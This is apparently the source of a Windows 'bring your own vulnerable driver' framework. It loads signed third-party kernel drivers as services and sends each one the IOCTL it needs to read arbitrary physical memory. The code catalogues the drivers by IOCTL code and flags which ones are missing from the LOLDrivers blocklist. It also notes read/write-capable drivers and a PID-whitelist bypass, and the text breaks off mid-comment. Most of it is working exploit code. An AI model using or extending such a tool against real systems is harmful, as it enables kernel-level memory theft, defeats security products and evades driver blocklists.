// membridge — unified 64-bit physical memory read framework with pluggable BYOV drivers.
//
// One read API, multiple signed drivers ("backends"):
//   cchwapi_2_9      CCHWApi.sys 2.9.0.0        (IOCTL 0x8024003C, u64 PA)
//   cchwapi_2_12     CCHWApi(1).sys 2.12.0.0    (IOCTL 0x8024003C, u64 PA)
//   cchwapi_ext_4_5  CCHWApiExt(1).sys 4.5.0.0  (IOCTL 0x802400FC, u64 PA)
//   sjtwinio         SjtWinIo.sys               (MapPhys 0x9C40A4C0 + ReadMapped 0x9C4064D0, u64 PA)
//   ufu_win10        win10_ufudev64.sys         (IOCTL 0x8010206E, 32-bit PA only)
//   winring0x64      WinRing0x64.sys            (IOCTL 0x9C406104, low 1MB only)
//
// The tool auto-loads the selected driver (control device drivers usually need only
// service start; SjtWinIo is a filter driver and is bound to a root-enumerated device),
// reads the requested physical bytes, optionally verifies an expected marker, and
// unloads/removes what it created.
//
// Authorized security research only. Read-only by design.
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <setupapi.h>
#include <devguid.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX, LY_MRT } layout_t;

typedef struct {
    const wchar_t *id;
    const wchar_t *rel_path;   // relative to msdriver-0day base dir
    bind_kind kind;
    const wchar_t *service;
    const wchar_t *device;
    layout_t layout;
    int full64;
    const wchar_t *desc;
} backend_t;

static const backend_t g_backends[] = {
    { L"cchwapi_2_9", L"drivers\\CCHWApi_sys\\CCHWApi.sys",
      BK_CONTROL, L"MembridgeCchwapi29", L"\\\\.\\CCHWAPI", LY_CCHWAPI, 1,
      L"CCHWApi.sys 2.9.0.0 (kHWAPIReadMemory 0x8024003C, u64 PA)" },
    { L"cchwapi_2_12", L"drivers\\CCHWApi(1)_sys\\CCHWApi(1).sys",
      BK_CONTROL, L"MembridgeCchwapi212", L"\\\\.\\CCHWAPI", LY_CCHWAPI, 1,
      L"CCHWApi(1).sys 2.12.0.0 (kHWAPIReadMemory 0x8024003C, u64 PA)" },
    { L"cchwapi_ext_4_5", L"drivers\\CCHWApiExt(1)_sys\\CCHWApiExt(1).sys",
      BK_CONTROL, L"MembridgeCchwapiExt45", L"\\\\.\\CCHWAPIExt", LY_CCHWAPI_EXT, 1,
      L"CCHWApiExt(1).sys 4.5.0.0 (ReadWriteMemStruct 0x802400FC, u64 PA)" },
    { L"sjtwinio", L"drivers\\SjtWinIo_sys\\SjtWinIo.sys",
      BK_FILTER, L"MembridgeSjtWinIo", L"\\\\.\\SJTWINIO0200", LY_SJT, 1,
      L"SjtWinIo.sys (filter driver; MapPhys 0x9C40A4C0 + ReadMapped 0x9C4064D0, u64 PA)" },
    { L"hp_swtools", L"drivers\\HP SW TOOLS DRIVER_sys\\HP SW TOOLS DRIVER.sys",
      BK_CONTROL, L"MembridgeHpSwtools", L"\\\\.\\HP_WKS_SWTOOLS_DRIVER", LY_HP_MAP, 1,
      L"HP SW TOOLS DRIVER.sys (MapPhysicalMemory 0x9C406104: u64 PA + size -> user VA, arbitrary 64-bit PA)" },
    { L"swtoolsdriver", L"drivers\\swtoolsdriver\\swtoolsdriver.sys",
      BK_CONTROL, L"MembridgeSwtools", L"\\\\.\\HP_WKS_SWTOOLS_DRIVER", LY_HP_MAP, 1,
      L"swtoolsdriver.sys (HP-family MapPhysicalMemory 0x9C406104, u64 PA + size -> user VA, arbitrary 64-bit PA)" },
    { L"hp_swtools_v1", L"drivers\\hp_swtools_v1\\HP_SWTOOLS_DRIVER_V1.sys",
      BK_CONTROL, L"MembridgeHpSwtoolsV1", L"\\\\.\\HP_SWTOOLS_DRIVER_V1", LY_HP_MAP, 1,
      L"HP SW TOOLS DRIVER V1 variant (SHA256 23C18666..., not in LOLDrivers; MapPhysicalMemory 0x9C406104, arbitrary 64-bit PA)" },
    { L"isharepp", L"drivers\\isharepp\\iSharePp.sys",
      BK_CONTROL, L"MembridgeIsharepp", L"\\\\.\\iSCSIBoot", LY_WINRING0, 1,
      L"iSharePp.sys (Pnp Driver for iSCSIDisk; OlsApi READ_MEMORY 0x9C406104, arbitrary 64-bit PA)" },
    { L"rtkio", L"drivers\\rtkio\\rtkio.sys",
      BK_CONTROL, L"MembridgeRtkio", L"\\\\.\\rtkio", LY_RTKIO_MAP, 1,
      L"rtkio.sys (Realtek; IOCTL_PHYMEM_MAP 0x80002000: u64 PA + size -> user VA, arbitrary 64-bit PA)" },
    { L"rtkiow8x64", L"drivers\\rtkiow8x64\\rtkiow8x64.sys",
      BK_CONTROL, L"MembridgeRtkioW8", L"\\\\.\\rtkio", LY_RTKIO_MAP, 1,
      L"rtkiow8x64.sys (Realtek W8 variant; same IOCTL_PHYMEM_MAP 0x80002000, arbitrary 64-bit PA)" },
    { L"eneio64", L"drivers\\eneio64\\eneio64.sys",
      BK_CONTROL, L"MembridgeEneio", L"\\\\.\\GLCKIo", LY_ENEIO_MAP, 1,
      L"eneio64.sys (ASUS/GIGABYTE ENE WinIO; IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
    { L"winio64_elan", L"drivers\\winio64_elan\\WinIo64_ELAN.sys",
      BK_CONTROL, L"MembridgeWinioElan", L"\\\\.\\WinIo", LY_ENEIO_MAP, 1,
      L"ELAN WinIo64 unlisted variant (SHA256 535CB6A6..., not in LOLDrivers; WinIO v3.0 IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
    { L"winio64_1", L"drivers\\winio64_1\\WinIo64_1.sys",
      BK_CONTROL, L"MembridgeWinio1", L"\\\\.\\WinIo", LY_ENEIO_MAP, 1,
      L"WinIo64(1).sys unlisted variant (SHA256 37BD7F1C..., not in LOLDrivers; WinIO v3.0 IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
    { L"glckio2", L"drivers\\glckio2\\glckio2.sys",
      BK_CONTROL, L"MembridgeGlckio2", L"\\\\.\\GLCKIo2", LY_GLCKIO2_MAP, 1,
      L"glckio2.sys (ASUS GLCKIO2; PID whitelist bypass via AES registration + IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
    { L"gibepext", L"drivers\\gibepext\\gibepext.sys",
      BK_CONTROL, L"MembridgeGibepExt", L"\\\\.\\GibEpExt", LY_GIBEPEXT, 1,
      L"gibepext.sys (GIGABYTE EP firmware/forensic; CRC32-gated IOCTL_READ_PHYSMEM 0x22E00C, arbitrary 64-bit PA; LOLDrivers unlisted)" },
    { L"gibepext2", L"drivers\\gibepext2\\gibepext2.sys",
      BK_CONTROL, L"MembridgeGibepExt2", L"\\\\.\\GibEpExt", LY_GIBEPEXT, 1,
      L"gibepext(2).sys unlisted variant (SHA256 202F6B04..., same CRC32-gated READ/WRITE_PHYSMEM, arbitrary 64-bit PA)" },
    { L"fastdumpx64", L"drivers\\fastdumpx64\\fastdumpx64.sys",
      BK_CONTROL, L"MembridgeFastDump", L"\\\\.\\FastDump", LY_FASTDUMP, 1,
      L"fastdumpx64.sys 2.3.0.92 (LOLDrivers unlisted; IOCTL 0x9C400014: u64 PA + u32 size, data at output+0x34, arbitrary 64-bit PA read)" },
    { L"fastdumpx64_v2", L"drivers\\fastdumpx64_v2\\fastdumpx64_v2.sys",
      BK_CONTROL, L"MembridgeFastDump2", L"\\\\.\\FastDump", LY_FASTDUMP, 1,
      L"fastdumpx64 unlisted variant (SHA256 99B11371..., same IOCTL 0x9C400014 arbitrary 64-bit PA read)" },
    { L"directio", L"drivers\\directio\\DirectIo.sys",
      BK_CONTROL, L"MembridgeDirectIo", L"\\\\.\\DirectIo", LY_DIRECTIO, 1,
      L"DirectIo.sys (LOLDrivers unlisted PassMark DirectIO; IOCTL 0x8011607C returns \\Device\\PhysicalMemory section handle, NtMapViewOfSection arbitrary physical read; device name = service name)" },
    { L"tdeio", L"drivers\\tdeio\\TdeIo64.sys",
      BK_CONTROL, L"MembridgeTdeIo", L"\\\\.\\TdeIo", LY_TDEIO, 1,
      L"TdeIo64.sys (LOLDrivers unlisted TDE I/O driver; IOCTL 0x91102440 maps arbitrary 64-bit physical range to user VA; read/write capable)" },
    { L"icachex", L"drivers\\icachex\\iCacheX.sys",
      BK_CONTROL, L"MembridgeICacheX", L"\\\\.\\iCacheX", LY_ICACHEX, 1,
      L"iCacheX(1).sys (LOLDrivers unlisted; embeds OlsApi: OlsApiReadMemory 0x9C406104 + OlsApiWriteMemory 0x9C40A108, arbitrary 64-bit physical read/write)" },
    { L"mrt", L"drivers\\mrt\\fekern_mrt.sys",
      BK_CONTROL, L"MembridgeFekern", L"\\\\.\\fekern_00", LY_MRT, 1,
      L"FireEye fekern MRT driver (LOLDrivers unlisted WHQL Publisher.sys; MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C via MmCopyMemory, arbitrary 64-bit physical read; device ACL SYSTEM-only)" },
    { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
      BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
      L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
    { L"winring0x64", L"drivers\\winring0\\WinRing0x64.sys",
      BK_CONTROL, L"MembridgeWinRing0", L"\\\\.\\WinRing0_1_2_0", LY_WINRING0, 0,
      L"WinRing0x64.sys (IOCTL 0x9C406104, low memory 0xC0000-0xFFFFF only)" },
};
#define NBACKENDS ((int)(sizeof(g_backends)/sizeof(g_backends[0])))

static backend_t g_bk;
static int g_have_bk = 0;
static wchar_t g_base[512];
static wchar_t g_driver_path[1024];
static wchar_t g_dyn_device[512];
static int g_loaded_service = 0;
static int g_bound_device = 0;
static wchar_t g_instance_id[256];
static wchar_t g_service_cur[160];
static int g_manual = 0;
static wchar_t g_manual_device[512];
static layout_t g_manual_layout = LY_CCHWAPI;

static const char *layout_name(layout_t l) {
    switch (l) {
    case LY_CCHWAPI: return "cchwapi";
    case LY_CCHWAPI_EXT: return "cchwapi_ext";
    case LY_SJT: return "sjtwinio";
    case LY_UFU: return "ufu";
    case LY_WINRING0: return "winring0";
    case LY_HP_MAP: return "hp_swtools";
    case LY_RTKIO_MAP: return "rtkio";
    case LY_ENEIO_MAP: return "eneio64";
    case LY_GLCKIO2_MAP: return "glckio2";
    case LY_GIBEPEXT: return "gibepext";
    case LY_FASTDUMP: return "fastdump";
    case LY_DIRECTIO: return "directio";
    case LY_TDEIO: return "tdeio";
    case LY_ICACHEX: return "icachex";
    case LY_MRT: return "mrt";
    }
    return "?";
}

static int is_admin(void) {
    BOOL member = FALSE;
    SID_IDENTIFIER_AUTHORITY nt = { SECURITY_NT_AUTHORITY };
    PSID admins = NULL;
    if (!AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0, &admins))
        return 0;
    if (!CheckTokenMembership(NULL, admins, &member))
        member = FALSE;
    FreeSid(admins);
    return member ? 1 : 0;
}

static void init_base(void) {
    wchar_t envBase[512];
    DWORD en = GetEnvironmentVariableW(L"MEMBRIDGE_BASE", envBase, 512);
    if (en > 0 && en < 512) {
        wcscpy(g_base, envBase);
        return;
    }
    wchar_t exe[1024];
    DWORD n = GetModuleFileNameW(NULL, exe, 1024);
    if (n == 0) { wcscpy(g_base, L"."); return; }
    wchar_t *p = wcsrchr(exe, L'\\'); if (p) *p = 0;      // ...\bin
    p = wcsrchr(exe, L'\\');
    if (p && _wcsicmp(p + 1, L"bin") == 0) *p = 0;         // ...\membridge
    wcscpy(g_base, exe);
}

static void build_driver_path(void) {
    if (g_driver_path[0]) return;   // overridden
    swprintf(g_driver_path, 1024, L"%ls\\%ls", g_base, g_bk.rel_path);
}

static HANDLE try_open_device(const wchar_t *path, int attempts, int delay_ms) {
    for (int i = 0; i < attempts; i++) {
        HANDLE h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) return h;
        Sleep(delay_ms);
    }
    return INVALID_HANDLE_VALUE;
}

// ---------------- service helpers ----------------
static int svc_create_and_start(const wchar_t *name, const wchar_t *path, int do_start) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) { wprintf(L"[ERR] OpenSCManager failed: %lu\n", GetLastError()); return 0; }
    SC_HANDLE svc = CreateServiceW(scm, name, name, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                   SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL);
    int ok = 0;
    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
        }
        if (!svc) { wprintf(L"[WARN] CreateService(%ls) failed: %lu\n", name, err); }
    } else {
        g_loaded_service = 1;
    }
    if (svc) {
        if (do_start) {
            if (StartServiceW(svc, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) ok = 1;
            else wprintf(L"[WARN] StartService(%ls) failed: %lu\n", name, GetLastError());
        } else {
            ok = 1;  // PnP will start the service when the root device is enabled
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok ? 1 : (g_loaded_service ? 0 : 1);  // if service existed, device may still work
}

static void svc_stop_and_delete(const wchar_t *name) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS st;
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

// ---------------- leftover cleanup (services / root devices) ----------------
static void svc_cleanup_prefix(const wchar_t *prefix) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) return;
    DWORD needed = 0, count = 0, resume = 0;
    EnumServicesStatusExW(scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0,
                          &needed, &count, &resume, NULL);
    if (needed) {
        BYTE *buf = (BYTE *)malloc(needed + 4096);
        if (buf) {
            resume = 0;
            if (EnumServicesStatusExW(scm, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER, SERVICE_STATE_ALL,
                                      buf, needed + 4096, &needed, &count, &resume, NULL)) {
                ENUM_SERVICE_STATUS_PROCESSW *arr = (ENUM_SERVICE_STATUS_PROCESSW *)buf;
                for (DWORD i = 0; i < count; i++) {
                    if (wcsncmp(arr[i].lpServiceName, prefix, wcslen(prefix)) == 0) {
                        SC_HANDLE svc = OpenServiceW(scm, arr[i].lpServiceName, SERVICE_ALL_ACCESS);
                        if (svc) {
                            SERVICE_STATUS st;
                            ControlService(svc, SERVICE_CONTROL_STOP, &st);
                            DeleteService(svc);
                            CloseServiceHandle(svc);
                            wprintf(L"[dbg] cleaned leftover service %ls\n", arr[i].lpServiceName);
                        }
                    }
                }
            }
            free(buf);
        }
    }
    CloseServiceHandle(scm);
}

static void rootdev_remove_all_hwid(const wchar_t *hwid) {
    HDEVINFO list = SetupDiGetClassDevsW(NULL, NULL, NULL, DIGCF_ALLCLASSES);
    if (list == INVALID_HANDLE_VALUE) return;
    SP_DEVINFO_DATA info;
    for (DWORD i = 0; ; i++) {
        memset(&info, 0, sizeof(info));
        info.cbSize = sizeof(info);
        if (!SetupDiEnumDeviceInfo(list, i, &info)) break;
        wchar_t hw[512];
        DWORD type = 0, sz = 0;
        if (SetupDiGetDeviceRegistryPropertyW(list, &info, SPDRP_HARDWAREID, &type, (BYTE *)hw,
                                              sizeof(hw), &sz)) {
            if (_wcsicmp(hw, hwid) == 0) {
                wchar_t instId[256];
                if (SetupDiGetDeviceInstanceIdW(list, &info, instId, 256, NULL)) {
                    wprintf(L"[dbg] removing leftover root device %ls\n", instId);
                    SetupDiCallClassInstaller(DIF_REMOVE, list, &info);
                }
            }
        }
    }
    SetupDiDestroyDeviceInfoList(list);
}

// ---------------- root-enumerated device (filter binding) ----------------
static void rootdev_remove_silent(const wchar_t *instanceId) {
    HDEVINFO list = SetupDiCreateDeviceInfoList(NULL, NULL);
    if (list == INVALID_HANDLE_VALUE) return;
    SP_DEVINFO_DATA info;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    if (SetupDiOpenDeviceInfoW(list, instanceId, NULL, 0, &info))
        SetupDiCallClassInstaller(DIF_REMOVE, list, &info);
    SetupDiDestroyDeviceInfoList(list);
}

static int rootdev_create_and_bind(const wchar_t *svc, wchar_t *instance_out, size_t out_cch) {
    GUID classGuid = { 0x4d36e97d, 0xe325, 0x11ce, { 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18 } };
    HDEVINFO list = SetupDiCreateDeviceInfoList(&classGuid, NULL);
    if (list == INVALID_HANDLE_VALUE) { wprintf(L"[ERR] SetupDiCreateDeviceInfoList: %lu\n", GetLastError()); return 0; }
    SP_DEVINFO_DATA info;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    if (!SetupDiCreateDeviceInfoW(list, L"BYOVRootDevice", &classGuid, L"BYOV root device",
                                  NULL, DICD_GENERATE_ID, &info)) {
        wprintf(L"[ERR] SetupDiCreateDeviceInfo: %lu\n", GetLastError());
        SetupDiDestroyDeviceInfoList(list);
        return 0;
    }
    const wchar_t *hwid = L"ROOT\\BYOVSJT";
    if (!SetupDiSetDeviceRegistryPropertyW(list, &info, SPDRP_HARDWAREID, (const BYTE *)hwid,
                                           (DWORD)((wcslen(hwid) + 2) * sizeof(wchar_t))) ||
        !SetupDiCallClassInstaller(DIF_REGISTERDEVICE, list, &info)) {
        wprintf(L"[ERR] register root device failed: %lu\n", GetLastError());
        SetupDiDestroyDeviceInfoList(list);
        return 0;
    }
    wchar_t instId[256];
    if (!SetupDiGetDeviceInstanceIdW(list, &info, instId, 256, NULL)) {
        wprintf(L"[ERR] GetDeviceInstanceId: %lu\n", GetLastError());
        SetupDiDestroyDeviceInfoList(list);
        return 0;
    }
    SetupDiDestroyDeviceInfoList(list);
    wcsncpy(instance_out, instId, out_cch - 1);
    instance_out[out_cch - 1] = 0;
    wprintf(L"[dbg] root instance=%ls\n", instId);

    // Set Service value on the device instance key directly.
    wchar_t keyPath[512];
    swprintf(keyPath, 512, L"SYSTEM\\CurrentControlSet\\Enum\\%ls", instId);
    HKEY hKey = NULL;
    LSTATUS stOpen = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey);
    if (stOpen == ERROR_SUCCESS) {
        LSTATUS st1 = RegSetValueExW(hKey, L"Service", 0, REG_SZ, (const BYTE *)svc,
                                     (DWORD)((wcslen(svc) + 1) * sizeof(wchar_t)));
        LSTATUS st2 = RegSetValueExW(hKey, L"Driver", 0, REG_SZ, (const BYTE *)svc,
                                     (DWORD)((wcslen(svc) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        wprintf(L"[dbg] Enum key ok, set Service=%ld Driver=%ld\n", (long)st1, (long)st2);
    } else {
        wprintf(L"[WARN] open Enum key failed err=%ld key=%ls\n", (long)stOpen, keyPath);
    }
    // Restart (disable -> enable) to force PnP to load the service as function driver.
    HDEVINFO list2 = SetupDiCreateDeviceInfoList(NULL, NULL);
    if (list2 != INVALID_HANDLE_VALUE) {
        SP_DEVINFO_DATA info2;
        memset(&info2, 0, sizeof(info2));
        info2.cbSize = sizeof(info2);
        if (SetupDiOpenDeviceInfoW(list2, instId, NULL, 0, &info2)) {
            SP_PROPCHANGE_PARAMS pcp;
            memset(&pcp, 0, sizeof(pcp));
            pcp.ClassInstallHeader.cbSize = sizeof(SP_CLASSINSTALL_HEADER);
            pcp.ClassInstallHeader.InstallFunction = DIF_PROPERTYCHANGE;
            pcp.StateChange = DICS_DISABLE;
            pcp.Scope = DICS_FLAG_GLOBAL;
            SetupDiSetClassInstallParamsW(list2, &info2, (SP_CLASSINSTALL_HEADER *)&pcp, sizeof(pcp));
            SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, list2, &info2);
            memset(&pcp, 0, sizeof(pcp));
            pcp.ClassInstallHeader.cbSize = sizeof(SP_CLASSINSTALL_HEADER);
            pcp.ClassInstallHeader.InstallFunction = DIF_PROPERTYCHANGE;
            pcp.StateChange = DICS_ENABLE;
            pcp.Scope = DICS_FLAG_GLOBAL;
            SetupDiSetClassInstallParamsW(list2, &info2, (SP_CLASSINSTALL_HEADER *)&pcp, sizeof(pcp));
            BOOL okDis = SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, list2, &info2);
            wprintf(L"[dbg] disable ok=%d err=%lu\n", okDis, GetLastError());
            memset(&pcp, 0, sizeof(pcp));
            pcp.ClassInstallHeader.cbSize = sizeof(SP_CLASSINSTALL_HEADER);
            pcp.ClassInstallHeader.InstallFunction = DIF_PROPERTYCHANGE;
            pcp.StateChange = DICS_ENABLE;
            pcp.Scope = DICS_FLAG_GLOBAL;
            SetupDiSetClassInstallParamsW(list2, &info2, (SP_CLASSINSTALL_HEADER *)&pcp, sizeof(pcp));
            BOOL okEn = SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, list2, &info2);
            wprintf(L"[dbg] enable ok=%d err=%lu\n", okEn, GetLastError());
        }
        SetupDiDestroyDeviceInfoList(list2);
    }
    g_bound_device = 1;
    return 1;
}

// ---------------- physical memory read layouts ----------------
static int read_cchwapi(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    size_t len = (size_t)size + 0x14;
    uint8_t *buf = (uint8_t *)malloc(len);
    DWORD ret = 0;
    if (!buf) return 0;
    memset(buf, 0, len);
    *(uint64_t *)(buf + 8) = pa;
    *(uint32_t *)(buf + 0x10) = size;
    BOOL ok = DeviceIoControl(dev, 0x8024003Cu, buf, (DWORD)len, buf, (DWORD)len, &ret, NULL);
    if (!ok) { wprintf(L"[ERR] cchwapi ReadMemory err=%lu\n", GetLastError()); free(buf); return 0; }
    memcpy(out, buf + 0x14, size);
    free(buf);
    return 1;
}

static int read_cchwapi_ext(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    static const uint32_t codes[] = { 0x802400FCu, 0x80240104u, 0x80240114u };
    size_t len = (size_t)size + 0x18;
    uint8_t *buf = (uint8_t *)malloc(len);
    DWORD ret = 0;
    if (!buf) return 0;
    for (int i = 0; i < 3; i++) {
        memset(buf, 0, len);
        *(uint64_t *)(buf + 8) = pa;
        *(uint32_t *)(buf + 16) = 0;
        *(uint32_t *)(buf + 20) = size;
        BOOL ok = DeviceIoControl(dev, codes[i], buf, (DWORD)len, buf, (DWORD)len, &ret, NULL);
        if (ok) {
            wprintf(L"[OK] cchwapi_ext ioctl=0x%08X\n", codes[i]);
            memcpy(out, buf + 0x18, size);
            free(buf);
            return 1;
        }
    }
    wprintf(L"[ERR] cchwapi_ext all read ioctls failed err=%lu\n", GetLastError());
    free(buf);
    return 0;
}

static int read_sjt(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t min[12], mout[0x30];
    uint32_t mapSize = (size + 0xFFFu) & ~0xFFFu;
    DWORD ret = 0;
    memset(min, 0, sizeof(min));
    memset(mout, 0, sizeof(mout));
    *(uint32_t *)(min + 0) = (uint32_t)(pa >> 32);
    *(uint32_t *)(min + 4) = (uint32_t)(pa & 0xFFFFFFFFu);
    *(uint32_t *)(min + 8) = mapSize;
    if (!DeviceIoControl(dev, 0x9C40A4C0u, min, sizeof(min), mout, sizeof(mout), &ret, NULL)) {
        wprintf(L"[ERR] sjtwinio MapPhys err=%lu\n", GetLastError());
        return 0;
    }
    uint8_t *ro = (uint8_t *)malloc((size_t)size + 0x10);
    uint8_t rin[0x20];
    if (!ro) return 0;
    memset(rin, 0, sizeof(rin));
    memset(ro, 0, (size_t)size + 0x10);
    *(uint32_t *)(rin + 0) = 0x11;
    *(uint32_t *)(rin + 8) = size;
    *(uint32_t *)(rin + 12) = 1;
    BOOL ok = DeviceIoControl(dev, 0x9C4064D0u, rin, 0x11, ro, (DWORD)(size + 0x10), &ret, NULL);
    if (!ok) { wprintf(L"[ERR] sjtwinio ReadMapped err=%lu\n", GetLastError()); free(ro); return 0; }
    memcpy(out, ro + 0x10, size);
    free(ro);
    return 1;
}

static int read_ufu(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    uint8_t *buf = (uint8_t *)malloc(0x1024);
    DWORD ret = 0;
    (void)size;
    if (pa > 0xFFFFFFFFull) { wprintf(L"[ERR] ufu only supports 32-bit physical addresses\n"); return 0; }
    if (!buf) return 0;
    memset(in, 0, sizeof(in));
    *(uint32_t *)(in + 0) = (uint32_t)pa;
    if (!DeviceIoControl(dev, 0x8010206Eu, in, sizeof(in), buf, 0x1024, &ret, NULL)) {
        wprintf(L"[ERR] ufu ReadMemory err=%lu\n", GetLastError());
        free(buf);
        return 0;
    }
    memcpy(out, buf, 0x1024);
    free(buf);
    return 1;
}

static int read_winring0(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = pa;
    *(uint32_t *)(in + 8) = 1;
    *(uint32_t *)(in + 0xC) = size;
    if (!DeviceIoControl(dev, 0x9C406104u, in, sizeof(in), out, size, &ret, NULL)) {
        wprintf(L"[ERR] winring0 ReadMemory err=%lu\n", GetLastError());
        return 0;
    }
    return 1;
}

// HP SW TOOLS: IOCTL 0x9C406104, input {u64 PA; u32 size} -> output struct with user VA at +8.
static int read_hp_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[12];
    uint8_t info[0x20];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    memset(info, 0, sizeof(info));
    *(uint64_t *)(in + 0) = pa;
    *(uint32_t *)(in + 8) = size;
    if (!DeviceIoControl(dev, 0x9C406104u, in, sizeof(in), info, sizeof(info), &ret, NULL)) {
        wprintf(L"[ERR] hp_swtools MapPhysicalMemory err=%lu\n", GetLastError());
        return 0;
    }
    uint64_t userVA = *(uint64_t *)(info + 8);
    if (userVA == 0) { wprintf(L"[ERR] hp_swtools returned NULL user VA\n"); return 0; }
    SIZE_T got = 0;
    if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)userVA, out, size, &got) || got != size) {
        wprintf(L"[ERR] hp_swtools ReadProcessMemory(mapped VA) err=%lu got=%zu\n", GetLastError(), got);
        return 0;
    }
    return 1;
}

// rtkio (Realtek): IOCTL 0x80002000, input 16B {u64 PA; u32 size; u32 pad} -> output user VA (qword).
static int read_rtkio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[16];
    uint64_t userVA = 0;
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = pa;
    *(uint32_t *)(in + 8) = size;
    if (!DeviceIoControl(dev, 0x80002000u, in, sizeof(in), &userVA, sizeof(userVA), &ret, NULL)) {
        wprintf(L"[ERR] rtkio IOCTL_PHYMEM_MAP err=%lu\n", GetLastError());
        return 0;
    }
    if (userVA == 0) { wprintf(L"[ERR] rtkio returned NULL user VA\n"); return 0; }
    SIZE_T got = 0;
    if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)userVA, out, size, &got) || got != size) {
        wprintf(L"[ERR] rtkio ReadProcessMemory(mapped VA) err=%lu got=%zu\n", GetLastError(), got);
        return 0;
    }
    return 1;
}

// eneio64 (WinIO-like): IOCTL_WINIO_MAPPHYSTOLIN 0x80102040.
// input 40B: {u64 size; u64 physical_address; ...}; output linear address in result struct (+16/+24/+32 candidates).
static int read_eneio_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
    uint8_t in[40];
    uint8_t res[40];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    memset(res, 0, sizeof(res));
    *(uint64_t *)(in + 0) = size;
    *(uint64_t *)(in + 8) = pa;
    if (!DeviceIoControl(dev, 0x80102040u, in, sizeof(in), res, sizeof(res), &ret, NULL)) {
        wprintf(L"[ERR] eneio64 IOCTL_WINIO_MAPPHYSTOLIN err=%lu\n", GetLastError());
        return 0;
    }
    uint64_t cand[3] = { *(uint64_t *)(res + 24), *(uint64_t *)(res + 16), *(uint64_t *)(res + 32) };
    for (int i = 0; i < 3; i++) {
        if (cand[i] < 0x10000 || cand[i] > 0x7FFFFFFFFFFFull) continue;
        SIZE_T got = 0;
        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cand[i], out, size, &got) && got == size)
            return 1;
    }
    wprintf(L"[ERR] eneio64 mapped linear address unusable\n");
    return 0;
}

// glckio2 (ASUS GLCKIO2): same WinIO MAPPHYSTOLIN structure as eneio64, but the driver
// gates IOCTLs by a PID whitelist. The whitelist can be populated by the registration IOCTL
// 0x80102060, which AES-128-ECB-decrypts its 16-byte input (key AA7E1516...) and compares it
